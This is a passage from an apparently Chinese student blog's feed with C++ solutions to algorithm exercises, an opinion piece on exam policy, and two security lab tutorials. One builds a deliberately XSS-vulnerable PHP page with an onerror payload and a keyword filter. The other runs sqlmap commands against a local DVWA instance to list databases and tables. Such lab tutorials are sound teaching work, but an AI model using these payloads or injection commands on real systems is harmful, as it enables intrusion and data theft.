输出输出一个整数，表示最大的和。 样例输入3 1 1 -2 样例输出2 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int main() { int n; int a[1010],b[1010]; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) { cin&gt;&gt;a[i]; } memset(b,0,sizeof(b)); b[0]=a[0]; int sum=0; for(int i=1;i&lt;n;i++) { b[i]=max(b[i-1]+a[i],a[i]); } for(int i=0;i&lt;n;i++) { if(b[i]&gt;sum) { sum=b[i]; } } cout&lt;&lt;sum&lt;&lt;endl; } 问题 G: 元素整除问题题目描述输入20个整数，输出其中能被数组中其它元素整除的那些数组元素。 输入输入20个整数 输出按输入顺序输出符合要求的数字，每行输出一个整数。 样例输入2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 样例输出4 6 8 9 10 12 14 15 16 18 20 21 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int main() { int a[20],b[20]; for(int i=0;i&lt;20;i++) { cin&gt;&gt;a[i]; b[i]=a[i]; } sort(b,b+20); for(int i=0;i&lt;20;i++) { //cout&lt;&lt;b[i]&lt;&quot; &quot;; int sign=0; for(int j=0;j&lt;20;j++) { if(b[j]&lt;a[i]) { if(a[i]%b[j]==0) sign=1; } else break; } if(sign==1) cout&lt;&lt;a[i]&lt;&lt;endl; } return 0; } 问题 H: 渊子赛马题目描述赛马是一古老的游戏，早在公元前四世纪的中国，处在诸侯割据的状态，历史上称为“战国时期”。在魏国作官的孙膑，因为受到同僚庞涓的迫害，被齐国使臣救出后，到达齐国国都。 赛马是当时最受齐国贵族欢迎的娱乐项目。上至国王，下到大臣，常常以赛马取乐，并以重金赌输赢。田忌多次与国王及其他大臣赌输赢，屡赌屡输。一天他赛马又输了，回家后闷闷不乐。孙膑安慰他说：“下次有机会带我到马场看看，也许我能帮你。” 孙膑仔细观察后发现，田忌的马和其他人的马相差并不远，只是策略运用不当，以致失败。 比赛前田忌按照孙膑的主意，用上等马鞍将下等马装饰起来，冒充上等马，与齐王的上等马比赛。第二场比赛，还是按照孙膑的安排，田忌用自己的上等马与国王的中等马比赛，在一片喝彩中，只见田忌的马竟然冲到齐王的马前面，赢了第二场。关键的第三场，田忌的中等马和国王的下等马比赛，田忌的马又一次冲到国王的马前面，结果二比一，田忌赢了国王。 就是这么简单，现在渊子也来赛一赛马。假设每匹马都有恒定的速度，所以速度大的马一定比速度小的马先到终点（没有意外！！）。不允许出现平局。最后谁赢的场数多于一半(不包括一半)，谁就是赢家(可能没有赢家)。渊子有 N(1&lt;=n&lt;=1000)匹马参加比赛。对手的马的数量与渊子马的数量一样，并且知道所有的马的速度。聪明的你来预测一下这场世纪之战的结果，看看渊子能否赢得比赛。 输入输入有多组测试数据。 每组测试数据包括 3 行： 第一行输入 N。表示马的数量。 第二行有 N 个整型数字，即渊子的 N 匹马的速度。 第三行有 N 个整型数字，即对手的 N 匹马的速度。 当 N 为 0 时退出。 输出若通过聪明的你精心安排，如果渊子能赢得比赛，那么输出YES。 否则输出NO。 样例输入5 2 3 3 4 5 1 2 3 4 5 4 2 2 1 2 2 2 3 1 0 样例输出YES NO 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int main() { int n; while(cin&gt;&gt;n&amp;&amp;n!=0) { int a[n],b[n]; for(int i=0;i&lt;n;i++) { cin&gt;&gt;a[i]; } for(int i=0;i&lt;n;i++) { cin&gt;&gt;b[i]; } sort(a,a+n); sort(b,b+n); int sum=0; for(int i=0;i&lt;n;i++) { for(int j=0;j&lt;n;j++) { if(b[i]&lt;a[j]) { sum++; a[j]=0; break; } } } if(sum&gt;=n/2+1) { cout&lt;&lt;&quot;YES&quot;&lt;&lt;endl; } else { cout&lt;&lt;&quot;NO&quot;&lt;&lt;endl; } } return 0; } 问题 I: 最长上升子序列题目描述给定一个长度为n的字符串S（只包含小写字母），给出q次查询，对于每次查询x，求出以S[x]（下标从0开始）为起始的最长上升子序列的长度（严格增）。 输入第一行两个整数n,q(1&lt;=n,q&lt;=1e5)，意义见题目描述。 第二行一个长度为n的字符串S。 第三行q个整数x(0&lt;=x&lt;n)，表示q次查询。 输出输出q个数（以空格分割，行末有空格），表示以S[x]为起始的最长上升子序列的长度。 样例输入10 3 abbaaccbbd 2 5 8 样例输出3 2 2 提示代码#include&lt;bits/stdc++.h&gt; #define max(a,b) ((a)&gt;(b)?(a):(b)) using namespace std; int n,q; char a[100010]; int ans[100010],p[30]; int main() { cin&gt;&gt;n&gt;&gt;q; cin&gt;&gt;a; for(int i=n-1;i&gt;=0;i--) { ans[i]=1; for(int j=a[i]-&#39;a&#39;+1;j&lt;26;j++) ans[i]=max(ans[i],p[j]+1); p[a[i]-&#39;a&#39;]=ans[i]; } int x; while(q--) { cin&gt;&gt;x; cout&lt;&lt;ans[x]&lt;&lt;&quot; &quot;; } } 问题 J: 区间第k小题目描述花花上算法课又偷偷摸鱼。她今天刚学会如何求解区间第k小的数，但是感觉没什么意思。于是她将题目稍稍改动了一下：对于一个长度为n的数列a来说，一共有n*(n+1)/2个子区间，对于数列a的每一个子区间，如果这个子区间的长度小于k，我们不管它，否则把该子区间的第k小的数加入新数列b（初始为空）。花花并不关心数列b里面的元素是什么，她只想知道新数列b中第k小的元素是多少。 例如，一个长度为4的数列a={5,3,4,9}，当k取3时只有三个子区间长度是&gt;=3的：{5,3,4},{3,4,9}和{5,3,4,9}。分别提取各自的第3小的数加入b数列得到{5,9,5},其中第3小的数为9。 输入第一行两个数n，k（1&lt;=n, k&lt;=1e5)意义见题目描述 第二行n个数表示数列a中的元素ai。(1&lt;=ai&lt;=1e9) 数据保证数列b中的元素个数不少于k个 输出输出一个数，表示数列b中的第k小的数 样例输入4 3 5 3 4 9 样例输出9 提示二分 代码#include&lt;bits/stdc++.h&gt; using namespace std; const int N = 100005; int a[N]; int n, k; long long max_position(int x) { long long result = 0; int l = 0, r = -1, num = 0; while (r &lt; n) { if (num &lt; k) { if (a[r + 1] &lt;= x)num++; r++; } else { result += n - r; if (a[l] &lt;= x)num--; l++; } } return result; } int main() { cin &gt;&gt; n &gt;&gt; k; int*b=new int[n]; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; b[i] = a[i]; } sort(b, b + n); int len = unique(b, b + n) - b; int l = 0, r = len - 1; int ans = 0; while (l &lt;= r) { int mid = (l + r) / 2; long long ret = max_position(b[mid]); if (ret &gt;= k) { ans = b[mid]; r = mid - 1; } else l = mid + 1; } cout &lt;&lt; ans; return 0; } 🚩推荐阅读算法实验考试算法实验作业算法实验（四）python-algorithmpython必会算法推荐检查回文数]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法作业（一）]]></title>
    <url>%2F2019%2F10%2F20%2F%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A1%2F</url>
    <content type="text"><![CDATA[算法作业一。 问题 A: 小雏鸟的成人式 2题目描述陶行知先生说：“我们要活的书，不要死的书 ”。 小雏鸟们从书上都是对的到现在能去伪存真的去使用书籍，证明你们长大了。总之就是要有自己的主见，自己的思考。 大白希望大家都能拿到一百分，所以对100这个数以及他的倍数很喜欢。 大白发现，从1开始，一定能找出一个序列从小到大排列，使得每一项都是 恰好能且仅能 被100整除D次。 请你编写程序，找到这个数列里第N个数。 输入 多行。每行输入两个整数，表示D和N，N范围[1,100]，D范围[0,2] 输出 每行对应输入，给出一个符合题意的整数 样例输入0 5 1 11 2 85 样例输出5 1100 850000 提示代码#include&lt;iostream&gt; #include&lt;cmath&gt; using namespace std; int main() { int d,n; while(cin&gt;&gt;d&gt;&gt;n) { if(n&gt;=1&amp;&amp;n&lt;100&amp;&amp;d&gt;=0&amp;&amp;d&lt;=2) cout&lt;&lt;n*int(pow(100,d))&lt;&lt;endl; else if(n==100) cout&lt;&lt;101*int(pow(100,d))&lt;&lt;endl; else continue; } } 问题 B: 小雏鸟的成人式 3题目描述陶行知先生说：“因为道德是做人的根本。根本一坏，纵然使你有一些学问和本领，也无甚用处。” 小雏鸟们需要时刻铭记在心，不管你长成什么样的的攻城狮，都必须三观正确。 涛涛轰这一天带着爱美酱来到了一个风景如画的地方游玩。艳阳高照，他俩玩的很尽兴，但是现在他们口渴了。 涛涛轰：“我要买饮料！” 店主：“我们这里有三种饮料，矿泉水1.5元一瓶，可乐2元一瓶，橙汁3.5元一瓶。” 涛涛轰：“好的，给我一瓶矿泉水。” 说完他掏出一张N元的大钞递给店主。 店主：“我忘了提醒你了，我们这里没有找客人钱的习惯的，多的钱我们都当小费收了的，嘿嘿。” 涛涛轰：“……” 涛涛轰环顾四周，就这一家商店，况且实在太渴了，看着脸热的粉扑扑的一头汗的爱美酱，就决定在这买了。不过涛涛轰想，与其把钱当小费送给他还不如自己多买一点饮料，反正早晚都要喝，但是要尽量少让他赚小费。 现在涛涛轰希望你能帮他计算一下，最少他要给店主多少小费。 输入输入数据的第一行是一个整数T(1&lt;=T&lt;=100)，代表测试数据的数量。然后是T行测试数据，每个测试数据只包含一个正整数N（1&lt;=N&lt;=10000），N代表小明手中钞票的面值，以分为单位。注意：商店里只有题中描述的三种饮料。 输出对于每组测试数据，请你输出小明最少要浪费多少钱给店主作为小费，以分为单位。 样例输入2 900 250 样例输出0 50 提示代码#include&lt;iostream&gt; #include&lt;cmath&gt; using namespace std; void test(int x) { if(x&lt;150) cout&lt;&lt;x&lt;&lt;endl; else if(x&lt;=200||x&gt;300) cout&lt;&lt;(x%50)&lt;&lt;endl; else cout&lt;&lt;x-200&lt;&lt;endl; } int main() { int n,x; cin&gt;&gt;n; while(n--) { cin&gt;&gt;x; test(x); } } 问题 C: 大白just大白题目描述大家都知道，大白对学术要求是很严格的。抄作业、考试作弊神马的在大白这简直不能忍。 这不刚刚过去的期末考试。有n个学生被查出来有问题。 大白给了他们申辩的机会，每个学生可以提交一段文字，作为申辩理由。但是大白发现来的人总会有一些奇怪的理由。 大白提前列了m个常见借口关键字。他想看看来申辩的学生中最烂的申辩理由是什么。 所谓最烂申辩理由就是，申辩里，含有常见借口关键字最多的。 含有关键字，指的是，理由中出现了一串和关键字完全匹配的字符串，如果出现大写小写不同，也认为匹配。比如，关键字是 bed 理由中出现Bedroom算含有一个关键字。 输入一个输入可能有多个case，每个case第一行两个数。分别代表n 和 m 接下来m行，每行一个关键字（字符串） 再接下来n行字符串。m和n都不大于20 每一个借口和借口关键字只会包含大小写字母，长度不会超过4000个字符。 输出对于每个case输出一行字符串，表示最烂的理由。若有多个理由包含相同数目的关键字，按输入顺序输出靠前的那个。 样例输入2 3 love cumt ACM ILoveCUMTACM cumtAACM 2 2 A b Ab bA 样例输出ILoveCUMTACM Ab 提示代码#include&lt;iostream&gt; #include&lt;string&gt; #include&lt;string.h&gt; #include &lt;algorithm&gt; using std::string; using namespace std; bool search(string str,string sub) { int i; if((i = str.find(sub, i)) != std::string::npos) return true; else return false; } int main() { int m,n,k=0,local=0; while(cin&gt;&gt;n&gt;&gt;m) { string key[m],ca[n],key1[m],ca1[n]; for(int i=0;i&lt;m;i++) { cin&gt;&gt;key[i]; key1[i]=key[i]; transform(key1[i].begin(),key1[i].end(),key1[i].begin(),::tolower); } for(int i=0;i&lt;n;i++) { cin&gt;&gt;ca[i]; ca1[i]=ca[i]; transform(ca1[i].begin(),ca1[i].end(),ca1[i].begin(),::tolower); } for(int i=0;i&lt;n;i++) { int num=0; for(int j=0;j&lt;m;j++) { if(search(ca1[i],key1[j])) num++; //cout&lt;&lt;search(ca1[i],key1[j])&lt;&lt;endl; } if(num&gt;k) { k=num; local=i; } } //cout&lt;&lt;local&lt;&lt;endl; //cout&lt;&lt;k&lt;&lt;endl; cout&lt;&lt;ca[local]&lt;&lt;endl; } } 问题 D: 小雏鸟的计算题目描述小雏鸟们的三角形翅膀终于长出健壮的肌肉和丰满的羽毛，已经跃跃欲试的去准备尝试挑战新的难题了。 考虑以下的算法：\1. 输入 n\2. 印出 n\3. 如果 n = 1 结束\4. 如果 n 是奇数 那么 n=3*n+1\5. 否则 n=n/2\6. GOTO 2例如输入 22 得到的数列： 22 11 34 17 52 26 13 40 20 10 5 16 8 4 2 1据推测此算法对任何整数而言会终止 (当打印出 1 的时候)。虽然此算法很简单，但以上的推测是否真实却无法知道。然而对所有的n ( 0 &lt; n &lt; 1000000 )来说，以上的推测已经被验证是正确的。给一个输入 n 透过以上的算法我们可以得到一个数列（1作为结尾）。此数列的长度称为n的cycle length。上面提到的例子 22的 cycle length为 16.问题来了：对任2个整数i，j我们想要知道介于i，j（包含i，j）之间的数所产生的数列中最大的cycle length是多少。 输入输入可能包含了好几行测试数据，每一行有一对整数 i，j 。 0&lt; i，j &lt; 1000000 输出对每一对输入 i j你应该要输出 i j和介于i j之间的数所产生的数列中最大的cycle length。 样例输入1 10 10 1 100 200 201 210 900 1000 样例输出1 10 20 10 1 20 100 200 125 201 210 89 900 1000 174 提示代码#include&lt;iostream&gt; using namespace std; int test(int n) { int count=0; while(n!=1) { count++; if(n%2!=0) n=3*n+1; else n=n/2; } count++; return count; } int main() { int i,j; while(cin&gt;&gt;i&gt;&gt;j) { cout&lt;&lt;i&lt;&lt;&quot; &quot;&lt;&lt;j&lt;&lt;&quot; &quot;; int max=0; if(i&gt;j) { int m; m=i; i=j; j=m; } for(int k=i;k&lt;=j;k++) { if(test(k)&gt;max) max=test(k); } cout&lt;&lt;max&lt;&lt;endl; } } 问题 E: 进制转换题目描述输入一个十进制正整数，然后输出它所对应的八进制数。 输入输入一个十进制正整数n(1≤n≤106) 。 输出输出n对应的八进制数，输出在一行。 样例输入10 样例输出12 提示代码#include&lt;iostream&gt; #include&lt;stack&gt; using namespace std; void transform(int x) { stack &lt;int&gt; stk; while(x!=0) { stk.push(x%8); x=x/8; } while(!stk.empty()) { cout&lt;&lt;stk.top(); stk.pop(); } cout&lt;&lt;endl; } int main() { int n; cin&gt;&gt;n; transform(n); } 问题 F: 排列问题题目描述 输入一个可能含有重复字符的字符串，打印出该字符串中所有字符的全排列。 输入单组测试数据，输入数据是一个长度不超过10个字符的字符串，以逗号结尾。 输出打印出该字符串中所有字符的全排列。以字典序顺序输出，用空格分隔。 样例输入abc, 样例输出abc acb bac bca cab cba 提示代码#include&lt;iostream&gt; #include&lt;cstdio&gt; #include&lt;string&gt; #include&lt;map&gt; #include&lt;algorithm&gt; using namespace std; int main() { string str; cin &gt;&gt; str; str = str.substr(0, str.length() - 1); sort(str.begin(),str.end()); do { cout &lt;&lt; str &lt;&lt;&quot; &quot;; }while(next_permutation(str.begin(),str.end())); return 0; } 问题 G: 快速幂题目描述 img 输入多组测试样例，最多50组。每组测试样例给定一个整数x(1&lt;=x&lt;=25000) 输出对每个样例，输出一行，代表f(x)对100000007取余的结果。 样例输入3 4 5 样例输出33 289 3414 提示代码#include&lt;iostream&gt; #include&lt;cmath&gt; using namespace std; long long n=100000007; long long poww(long long a, long long b) { long long ans = 1; while (b) { if (b &amp; 1 != 0) ans=ans*a%n; a=a*a%n; b &gt;&gt;= 1; } return ans; } int main() { long long n=100000007; int x; while(cin&gt;&gt;x) { long long sum=0; for(int i=1;i&lt;=x;i++) { sum+=(poww(i,i)); } cout&lt;&lt;(sum+1)%n&lt;&lt;endl; } return 0; } 问题 H: 求第k小题目描述给定n(1&lt;=n&lt;=1000000)个元素，求第k小数(1&lt;=k&lt;=n)。 输入一组样例。第一行输入两个整数n和k。第二行输入n个不同的int范围内的数。 输出输出一行，输出第k小数。 样例输入5 2 1 5 3 2 4 样例输出2 提示代码#include&lt;iostream&gt; #include&lt;algorithm&gt; using namespace std; int a[1000010]; int main() { int n,k; cin&gt;&gt;n&gt;&gt;k; for(int i=0;i&lt;n;i++) { cin&gt;&gt;a[i]; } sort(a,a+n); cout&lt;&lt;a[k-1]&lt;&lt;endl; } 问题 I: 沙子的质量题目描述设有N堆沙子排成一排，其编号为1，2，3，…，N（N&lt; =300）。每堆沙子有一定的数量，可以用一个整数来描述，现在要将N堆沙子合并成为一堆，每次只能合并相邻的两堆，合并的代价为这两堆沙子的数量之和，合并后与这两堆沙子相邻的沙子将和新堆相邻，合并时由于选择的顺序不同，合并的总代价也不相同，如有4堆沙子分别为1 3 5 2我们可以先合并1、2堆，代价为4，得到4 5 2又合并1，2堆，代价为9，得到9 2，再合并得到11，总代价为4+9+11=24，如果第二步是先合并2，3堆，则代价为7，得到4 7，最后一次合并代价为11，总代价为4+7+11=22；问题是：找出一种合理的方法，使总的代价最小。输出最小代价。 输入第一行一个数N表示沙子的堆数N。 第二行N个数，表示每堆沙子的质量。 a[i]&lt; =1000。 输出合并的最小代价。 样例输入4 1 3 5 2 样例输出22 提示代码#include &lt;cstdio&gt; #include &lt;cstdlib&gt; #include &lt;cmath&gt; #include &lt;cstring&gt; #include &lt;iostream&gt; #include &lt;algorithm&gt; using namespace std; int n; int num[305]; int f[305][305]; //合并a堆到b堆的最小代价 int main() { cin&gt;&gt;n; memset(f,127/3,sizeof(f)); //初始化为一个较大值，注意memset的用法！ for(int i=1; i&lt;=n; i++) { cin&gt;&gt;num[i]; num[i]+=num[i-1]; f[i][i]=0; } for(int i=2; i&lt;=n; i++) //求1到i堆的最小代价 { for(int j=i-1; j&gt;=1; j--) //求j到i堆的最小代价 { for(int k=j; k&lt;=i; k++) //找到j到i堆的最小代价 { f[j][i]=min(f[j][i],f[j][k]+f[k+1][i]+num[i]-num[j-1]); } } } cout&lt;&lt;f[1][n]; return 0; } 问题 J: 最长公共子序列题目描述一个字符串A的子串被定义成从A中顺次选出若干个字符构成的串。如A=“cdaad” ,顺次选1，3，5个字符就构成子串” cad” ,现给定两个字符串，求它们的最长共公子串。 输入第一行两个字符串用空格分开。两个串的长度均小于2000 。 输出最长子串的长度。 样例输入abccd aecd 样例输出3 提示代码#include&lt;iostream&gt; #include&lt;string.h&gt; using namespace std; int maxx(int a,int b) { if (a&gt;=b) return a; return b; } int main() { string a,b; cin&gt;&gt;a&gt;&gt;b; int n,m,max=0; n=a.size(); m=b.size(); int lcm[n+1][m+1]; for(int i = 0; i &lt;= n; ++i) lcm[i][0] = 0; for(int i = 0; i &lt;= m; ++i) lcm[0][i] = 0; for(int i=1;i&lt;=n;i++) { for(int j=1;j&lt;=m;j++) { if(a[i-1]==b[j-1]) { lcm[i][j]=lcm[i-1][j-1]+1; } else { lcm[i][j]=maxx(lcm[i][j-1],lcm[i-1][j]); } } } cout&lt;&lt;lcm[n][m]; } 🚩推荐阅读算法实验考试算法实验作业算法实验（四）python-algorithmpython必会算法推荐检查回文数]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS攻击简单示例]]></title>
    <url>%2F2019%2F10%2F13%2FXSS%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[xss 建立漏洞页面在www目录下新建xss.php,代码如下 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; &lt;title&gt;xss漏洞简单搭建&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;center&gt; &lt;h6&gt;把我们输入的字符串输出到input里的value属性里&lt;/h6&gt; &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input_value&quot; value=&quot;输入&quot;&gt;&lt;br /&gt; &lt;input type=&#39;submit&#39;&gt; &lt;/form&gt; &lt;hr&gt; &lt;?php //php防注入和XSS攻击通用过滤 $_GET &amp;&amp; SafeFilter($_GET); $_POST &amp;&amp; SafeFilter($_POST); $_COOKIE &amp;&amp; SafeFilter($_COOKIE); function SafeFilter (&amp;$arr) { $ra=Array(&#39;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#39;,&#39;/script/&#39;,&#39;/javascript/&#39;,&#39;/vbscript/&#39;,&#39;/expression/&#39;,&#39;/applet/&#39; ,&#39;/meta/&#39;,&#39;/xml/&#39;,&#39;/blink/&#39;,&#39;/link/&#39;,&#39;/style/&#39;,&#39;/embed/&#39;,&#39;/object/&#39;,&#39;/frame/&#39;,&#39;/layer/&#39;,&#39;/title/&#39;,&#39;/bgsound/&#39; ,&#39;/base/&#39;,&#39;/onload/&#39;,&#39;/onunload/&#39;,&#39;/onchange/&#39;,&#39;/onsubmit/&#39;,&#39;/onreset/&#39;,&#39;/onselect/&#39;,&#39;/onblur/&#39;,&#39;/onfocus/&#39;, &#39;/onabort/&#39;,&#39;/onkeydown/&#39;,&#39;/onkeypress/&#39;,&#39;/onkeyup/&#39;,&#39;/onclick/&#39;,&#39;/ondblclick/&#39;,&#39;/onmousedown/&#39;,&#39;/onmousemove/&#39; ,&#39;/onmouseout/&#39;,&#39;/onmouseover/&#39;,&#39;/onmouseup/&#39;,&#39;/onunload/&#39;); if (is_array($arr)) { foreach ($arr as $key =&gt; $value) { if (!is_array($value)) { if (!get_magic_quotes_gpc()) //不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。 { $value = addslashes($value); //给单引号（&#39;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符） 加上反斜线转义 } $value = preg_replace($ra,&#39;&#39;,$value); //删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 } else { SafeFilter($arr[$key]); } } } } if (isset($_GET[&#39;xss_input_value&#39;])) { $s=$_GET[&#39;xss_input_value&#39;]; echo&#39;&lt;input type=&quot;text&quot; value=&quot;&#39;.$_GET[&#39;xss_input_value&#39;].&#39;&quot;&gt;&#39;; } else{ echo &#39;&lt;input type=&quot;text&quot; value=&quot;输出&quot;&gt;&#39;; } ?&gt; &lt;/center&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 在浏览器输入http://localhost/xss.php/ 进入页面 1570973405972 输入 &quot;&gt;&lt;img src=1 onerror=alert(/xss/)&gt; L0_P317WRNGPCYPGDQPG_0O.png 攻击成功 漏洞修补将xss.php中 //$_GET &amp;&amp; SafeFilter($_GET); 注释去掉 $_GET &amp;&amp; SafeFilter($_GET); 通过SafeFilter()函数来过滤输入的内容 再输入刚才的内容 _I9UOP3AI0448_OMY9_R_6Y.png 注意：建议用ie浏览器打开，关闭ie浏览器的xss过滤器]]></content>
      <categories>
        <category>XSS攻击</category>
      </categories>
      <tags>
        <tag>XSS攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[教育部取消毕业前补考的意见(某人的毛概作业)]]></title>
    <url>%2F2019%2F10%2F13%2F%E6%95%99%E8%82%B2%E9%83%A8%E5%8F%96%E6%B6%88%E6%AF%95%E4%B8%9A%E5%89%8D%E8%A1%A5%E8%80%83%E7%9A%84%E6%84%8F%E8%A7%81%2F</url>
    <content type="text"><![CDATA[据教育部10月12日消息，近日，教育部印发了《关于深化本科教育教学改革 全面提高人才培养质量的意见》（以下简称《意见》）。 《意见》要求，要严把考试和毕业出口关。加强考试管理，严肃考试纪律，坚决取消毕业前补考等“清考”行为。加强学生体育课程考核，不能达到《国家学生体质健康标准》合格要求者不能毕业。科学合理制定本科毕业设计（论文）要求，严格全过程管理，严肃处理各类学术不端行为。落实学士学位管理办法，健全学士学位管理制度，严格学士学位标准和授权管理，严把学位授予关。 先从个人观点来说，这件事对自己来说是没有影响的，因为我觉得在大学里成绩门门都上90是不容易的，但是只要按时上课，不经常逃课，上课认真听听，不是一直在玩手机，考试前在突击复习一下，不能保证90+，但是及格还是没有什么大问题的，反而原来有毕业大补考，助长了那些不去上课，懒在宿舍睡觉的人。 从学校，老师的层面来看，这是不太公平的，因为每个学校的教学质量，学术要求都是不一样的，课程难度也是不一样的，必修课通过率可能会很高，专业课甚至挂科率能到达恐怖的50%，而且还有平时分这么玄妙的东西，如果老师的平时分严格按照学生平时表现给（当然不可能），这个《意见》绝对是公平的，而且是必要的。但是大学的分数又很玄妙，老师一般不按学生表现给平时分（因为学生实在太多），一般会用平时作业来代替，这就给了某些人有机可趁，经常去老师那问问题，让老师记住你，老师就可能会给很高的平时分（经常），因为本来老师就不认识几个人。其实这个现象还算好的，因为你至少学了，还获得好处，一下情况是最让人恶心的，亲身经历。 某一《课程》，老师讲的实在太“高深”，我实在听不懂，就跑去了其它班听课，他平时也不点名，他布置的平时作业也认真写了，最后卷面我考了90+，平时分给了70+，原来是他布置网络作业的时候要求没说明白，导致网上导出的成绩很低，这明明是老师的原因，本来这门课可以满绩点，甚至保研的时候多点希望，就这样被老师的不负责给抹掉了。 所以如果每个大学，每个老师，每门课程的成绩认定对每位同学都是公平的话，这篇《意见》我希望马上在每所大学实施，但现阶段对一部分人来说可能是不公平的，相反，大学可能会为了通过率，而减小考核难度，成绩作假等等，而这些我相信并不是《意见》所希望看到的。 再从国家层面来看，教育部就是想做两件事—严格人才分层，高校考核综合化合理化。“严进宽出”的时代要结束。 中国高校肯定算不上“严出”，如今从教育部到各高校都开始重视起来，当然是件好事。 但是，“严出”应该从课程标准上严格，比如教师的PPT不能七八年都用同一套，一些混学分的“水”课该消失就得消失。 另外，国内高校善用“数字指标”管理，很可能强行设置淘汰率，毕竟国内曾有名校每门课控制10%学生不及格的规定。 这是一把“双刃剑”，应谨慎掌握，这意味着大家都努力，也有人会被淘汰。这样绝对化的评价显然有失公平，其负面效应可能影响正面初衷。 千万不能只从毕业率上严格，硬性规定学校要有多少淘汰率，那只是“换汤不换药”。 从世界范围内看，大学本不该是这般“好混”。 从教育规律本身、高等教育所要体现的含金量来说，大学学习无疑需要学生付出相当精力。 但为什么之前很多高校都对学生“心慈手软”了呢？ 因为在现在的高考体制下，中国学生读大学的机会成本太高。学生一旦被退学，就相当于一无所有，只能返回原籍，想再读大学，就要重新参加高考。 所以，大学在把严出口关的同时，对于学习跟不上的学生，应该有制度配套，以免让他们失去接受教育的机会。 总体来看《意见》的出发点是好的，但是目前中国的教育还存在一些矛盾，要想达到《意见》的初衷还需要一段时间去解决，我还是很看好教育部的“严出”措施，因为目前来说本科生已经十分不值钱了。 🚩推荐阅读华为任正非这样说——我会告诉特朗普，他太伟大了！南阳“水氢发动机”，加入就能跑，解决了人类千百年来的能源问题？]]></content>
      <categories>
        <category>新闻点评</category>
      </categories>
      <tags>
        <tag>新闻</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用sqlmap注入dvwa]]></title>
    <url>%2F2019%2F10%2F13%2F%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%2F</url>
    <content type="text"><![CDATA[利用sqlmap对dvwa进行注入。 kali自带sqlmap，在主机安装DVWA DVWA的安装： http://www.dvwa.co.uk/ 进入网址，下载zip，解压到www目录下，修改www/DVWA/config/config.inc.php中的数据库密码 浏览器进入localhost/DVWA/输入默认用户名admin,密码password，然后点击页面上的“create/reset database”就可以完成了，将DVWA security改成非impossible LBPT_7ZN9O_Z6Z_9_9_GJCN.png 在kali上上启动sqlmap，由于我是虚拟机上运行的sqlmap，只需要将localhost换成主机IP即可 开始注入url: sqlmap -u &quot;http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0&quot; 由于这个注入页面需要登陆，所以还得加上cookie(chrome下cookie导出工具editthiscookie),过程中会不断让输入Y/N，可以加上参数—batch，来自动填写默认值。 _GCJPZ3_5T3T97_6K37__QN.png 得到数据库类型版本信息(mysql)，服务器类型版本信息(apache，php) 用—dbs查看数据库名 sqlmap -u &quot;http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0&quot; --batch --dbs 7QU2_IR5VYECTF~_V~QPQ_6.png 得到6个数据库名 用—D xxx查看指定数据库，—tables查看数据库中表信息 sqlmap -u &quot;http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0&quot; --batch -D dvwa --tables __O`CQDEB_3S_A_WIYRY089.png 得到了数据库dvwa的所有表名 用—T xxx查看指定表，—columns查看表的列信息 sqlmap -u &quot;http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0&quot; --batch -D dvwa -T users --columns _K_TD7~IC_AW_D_~656GBNQ.png 得到了数据库dvwa中表users的数据信息 注入成功！ 🚩推荐阅读DVWA-SQL_Injection_Blind（sql盲注）DVWA-SQL_Injection(SQL注入)简单sql注入环境搭建及注入我的WafBypass之道 三篇笔记SQL注入脚本练习]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单sql注入环境搭建及注入]]></title>
    <url>%2F2019%2F10%2F12%2F%E7%AE%80%E5%8D%95sql%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%B3%A8%E5%85%A5%2F</url>
